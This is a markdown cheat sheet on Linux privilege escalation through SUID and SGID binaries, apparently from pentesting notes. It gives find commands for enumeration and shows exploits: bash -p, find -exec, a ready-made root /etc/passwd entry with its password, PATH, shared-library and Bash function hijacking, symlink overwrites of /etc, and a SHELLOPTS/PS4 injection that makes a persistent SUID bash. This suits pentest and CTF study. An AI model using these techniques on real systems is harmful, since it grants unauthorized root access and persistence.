# SUID and SGID

* [Explanation](#explanation)
* [Enumeration](#enumeration)
* [Binaries that should not have SUID (but sometimes do)](#binaries-that-should-not-have-suid)
* [Relative Path Highjacking](#relative-path-highjacking)
* [Shared Object Library Highjacking](#shared-object-library-highjacking)
* [Symlinks](#symlinks)
* [Bash Function Highjacking (Bash <4.2-048)](#bash-function-highjacking)
* [Bash SHELLOPTS (Bash <4.4)](#bash-shellopts)
* [Boring SUID Files](#boring-suid-files)

## Explanation

* A binary with the **SUID** bit set will be executed with permissions of the **user** who owns the file. So we are interested in SUID binaries owned by the root user.
* A binary with the **SGID** bit set will be executed with permissions of the **group** who owns the file. So we are interested in SGID binaries owned by the root group or other powerful groups.

Obviously the end goal is to get the binary in question to execute a command for us, which will then be executed with the more powerful user id or group id.

If an incompetent user put a SUID bit on `/bin/bash` or `/bin/cp`, then this process is rather straightforward, but with other binaries we need to get creative. Or we might not be able to exploit it at all, which is usually the case with default SUID binaries like `su` or `passwd`.


## Enumeration

Search commands:
```bash
# Find all SUID and SGID files
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -al {} \; 2> /dev/null

# Files with SUID
find / -type f -perm -u+s -exec ls -al {} \; 2> /dev/null

# Files with SGID
find / -type f -perm -g+s -exec ls -al {} \; 2> /dev/null

# root only
## SUID owned by root user
find / -user root -type f -perm -u+s -exec ls -al {} \; 2> /dev/null

## SGID owned by root group
find / -group root -type f -perm -g+s -exec ls -al {} \; 2> /dev/null
```


You are in particularly interested in:

* **Uncommon** SUID binaries (takes some experience, also ask Google)
* **Default binaries that usually should not have** a SUID bit (you can compare those to your own machine, also ask Google)
* **Outdated** SUID binaries with known exploits

For the last point try to enumerate the versions and search google/searchsploit for exploits.

```bash
# Example version enumeration on SUID binary
/usr/sbin/exim --version
/usr/sbin/exim -v
```

Use **GTFOBins** (also Google) to find ways to exploit the found binaries: https://gtfobins.github.io/


## Binaries that should not have SUID

Sometimes users set the wrong permissions on files by accident or out of convenience.

Here are some examples of how to exploit such user error SUID files.

### bash

If /bin/bash has a SUID bit set for some reason, then you can just execute it with the -p parameter and gain a root shell.

```bash
/bin/bash -p
# root shell pops here
```

You can also create this vulnerability on purpose if you want to create a persistant way to elevate to root post-exploitation. Just copy bash to /tmp and set the suid bit with chmod.

### cp

If /bin/cp has a SUID bit set for some reason, then you can simply overwrite important files.

Make a backup of /etc/passwd and then replace it with your own tampered version, which contains another root user.

Example (password is cowabunga77):
```bash
hack:$1$hack$Ms0RDU0fPwY2uBBL9/Cnb/:0:0:root:/root:/bin/bash
```

### find

If /bin/find has a SUID bit set for some reason, then you can execute commands as root using the exec keyword.

```bash
cd /tmp
touch bigfoot
find bigfoot -exec "whoami" \;

# prints "root"
```

### Text Editors

Just edit /etc/passwd and add another root user at the bottom with some password hash you know the password of.

Example (password is cowabunga77):
```bash
hack:$1$hack$Ms0RDU0fPwY2uBBL9/Cnb/:0:0:root:/root:/bin/bash
```


## Relative Path Highjacking

The SUID file might execute some system() commands. If those commands do not have absolute paths, then you can most likely highjack them by simply changing your own PATH before executing the SUID file.

If possible try to use **pspy** to see what gets executed when you run the SUID file. 

Otherwise you need to do manual enumeration.

Manual commands used to see what system commands get executed by the SUID file:

```bash
$ strings /usr/local/bin/vulnerable_bin
/lib64/ld-linux-x86-64.so.2
#...
service apache2 start
```

Here we see the apache2 service being started via `service` command.

Confirm with strace:
```bash
$ strace-v -f -e execve /usr/local/bin/vulnerable_bin 2>&1 | grep service
[pid12573] execve("/bin/sh", ["sh", "-c", "service apache2 start"],
#...
```

Or using ltrace:
```bash
$ ltrace /usr/local/bin/vulnerable_bin 2>&1 | grep service
system("service apache2 start"
```

Use the usual PATH trick to add a directory at the start of your PATH:

```bash
export $PATH=/tmp/exploit/:$PATH
```

Create a malicious binary (e.g. a reverse shell) in /tmp/exploit/ named `service`.

Re-run the SUID file and your malicious "service" binary should be executed instead of the regular service binary.


## Shared Object Library Highjacking

Sometimes we might not be able to exploit a SUID file directly, but rather one of the `.so` libraries it tries to execute.

Look for missing shared object files with strace (`vulnerable_bin` here being the SUID binary we can access):

```bash
strace /usr/local/bin/vulnerable_bin 2>&1 | grep -iE "open|access|no such file"
```

One result is:
```bash
#...
open("/home/user/libs/libexample.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

If we can write to that location, then we have won.

Just create that `libexample.so` binary at the given location and you are gold. Execute the suid binary and your own binary will be executed.


## Symlinks

If a SUID binary naively copies (and overwrites) the content of one directory to another and we control both locations, then we can overwrite arbitrary files.

In the source directory create a tampered version of the /etc/passwd file. Add another root user at the bottom with some password hash.

Example (password is cowabunga77):
```bash
hack:$1$hack$Ms0RDU0fPwY2uBBL9/Cnb/:0:0:root:/root:/bin/bash
```

Replace the target directory with a symlink to `/etc/`
```bash
ln -s /etc /path/of/target
```

Once the SUID binary copies over the the files from the source directory, they will overwrite whatever files are in /etc/ with the same name.

Afterwards confirm that passwd is overwritten. Then you can just use `su` to switch to the new root user.

```bash
su hack
# type the hashed password when prompted
# now you are root
```

Worth noting is though that **this will not work if the symlink is in a directory with sticky bit set** (like /tmp/). In those directories the symlink needs to be owned by the same user who follows it.


## Bash Function Highjacking

In **Bash before version 4.2-048**, you can define functions with the same names as absolute program paths.

For example (just write in terminal):
```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```
Here we have created a function with the same name as the absolute path of the service binary. 
And this function takes precedence over the actual binary!

So, if you investigate a SUID file like in the previous section (pspy, ltrace, strace, strings), then you can highjack their system calls with such a function. 

And it even works if they used a full abolute path!

Check bash version:
```bash
bash --version
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
```

Example SUID binary investigated:
```bash
$ strings /usr/local/bin/vulnerable_bin_env
...
/usr/sbin/service apache2 start
...

$ ltrace /usr/local/bin/vulnerable_bin_env 2>&1 | grep service
system("/usr/sbin/service apache2 start"
```

## Bash SHELLOPTS

Relevant for: **Bash before version 4.4**.

If a SUID file runs another program via Bash (e.g. by using system()) environment variables can be inherited, including SHELLOPTS and PS4.

Investigate SUID files as described in the previous sections (ltrace, strace, strings, pspy) to find one that calls /bin/bash or system().

If you find one, then you can inject the two debug environment variables SHELLOPTS and PS4, which will be executed by the new instance of bash, allowing you to execute arbitrary commands as root.

```bash
env -i SHELLOPTS=xtrace PS4='$(<root_command_injection>)' <SUID_file>
```

Example:
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
```

Be wary that the injected command gets executed with every debug output of xtrace. So only use commands for the injection that can be run repeatedly without causing havoc on the machine.


## Boring SUID Files

Here is a list of standard (boring) SUID files that are commonly found on Linux machines. 

The point of this list is that you can check whether a found SUID file is custom / non-standard and therefore interesting.

This does not mean a standard SUID file cannot be vulnerable, you might want to check the versions of the standard SUID files if everything else fails. Linpeas tends to check that for you.

```bash
/bin/fusermount
/bin/mount
/bin/ntfs-3g
/bin/ping
/bin/ping6
/bin/su
/bin/umount
/lib64/dbus-1/dbus-daemon-launch-helper
/sbin/mount.ecryptfs_private
/sbin/mount.nfs
/sbin/pam_timestamp_check
/sbin/pccardctl
/sbin/unix2_chkpwd
/sbin/unix_chkpwd
/usr/bin/Xorg
/usr/bin/arping
/usr/bin/at
/usr/bin/beep
/usr/bin/chage
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/expiry
/usr/bin/firejail
/usr/bin/fusermount
/usr/bin/fusermount-glusterfs
/usr/bin/gpasswd
/usr/bin/kismet_capture
/usr/bin/mount
/usr/bin/mtr
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/procmail
/usr/bin/staprun
/usr/bin/su
/usr/bin/sudo
/usr/bin/sudoedit
/usr/bin/traceroute6.iputils
/usr/bin/umount
/usr/bin/weston-launch
/usr/lib/chromium-browser/chrome-sandbox
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/dbus-1/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/pt_chown
/usr/lib/snapd/snap-confine
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/xorg/Xorg.wrap
/usr/libexec/Xorg.wrap
/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/gstreamer-1.0/gst-ptp-helper
/usr/libexec/openssh/ssh-keysign
/usr/libexec/polkit-1/polkit-agent-helper-1
/usr/libexec/pt_chown
/usr/libexec/qemu-bridge-helper
/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/grub2-set-bootflag
/usr/sbin/mount.nfs
/usr/sbin/mtr-packet
/usr/sbin/pam_timestamp_check
/usr/sbin/pppd
/usr/sbin/pppoe-wrapper
/usr/sbin/suexec
/usr/sbin/unix_chkpwd
/usr/sbin/userhelper
/usr/sbin/usernetctl
/usr/sbin/uuidd
```

## References

* https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
* https://materials.rangeforce.com/tutorial/2019/11/07/Linux-PrivEsc-SUID-Bit/
* https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh